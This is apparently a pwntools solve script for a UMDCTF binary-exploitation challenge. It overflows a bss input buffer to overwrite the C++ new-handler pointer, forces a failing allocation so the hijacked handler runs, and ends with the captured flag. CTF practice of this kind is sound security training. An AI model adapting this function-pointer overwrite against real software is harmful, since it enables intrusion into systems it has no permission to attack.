from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./unfinished', '''
    b *(main+165)
    continue
''')

# p = remote('challs.umdctf.io', 31003)

# main function activities:
# call fgets to read input into a buffer in bss section starting from 0x41f060
# call atoi to convert input to a number; if it's less than or equal to 0x1ffffffffffffffe, call operator new[]
# operator new[] activities:
# jump to operator new
# operator new activities:
# call malloc with the number as the size; if malloc fails, call std::get_new_handler
# std::get_new_handler activities:
# call (anonymous namespace)::__new_handler at 0x41f128 in bss section

payload = str(0x1ffffffffffffffe).encode()  # ensure that operator new function has a failed malloc call
payload += b'A'*(0x41f128-0x41f060-len(payload))  # pad to (anonymous namespace)::__new_handler at 0x41f128
payload += p64(0x4019b6)  # overwrite (anonymous namespace)::__new_handler at 0x41f128 with target function at 0x4019b6
p.sendlineafter(b"What size allocation?\n", payload)

p.interactive()

# UMDCTF{crap_i_have_to_come_up_with_a_flag_too?????????}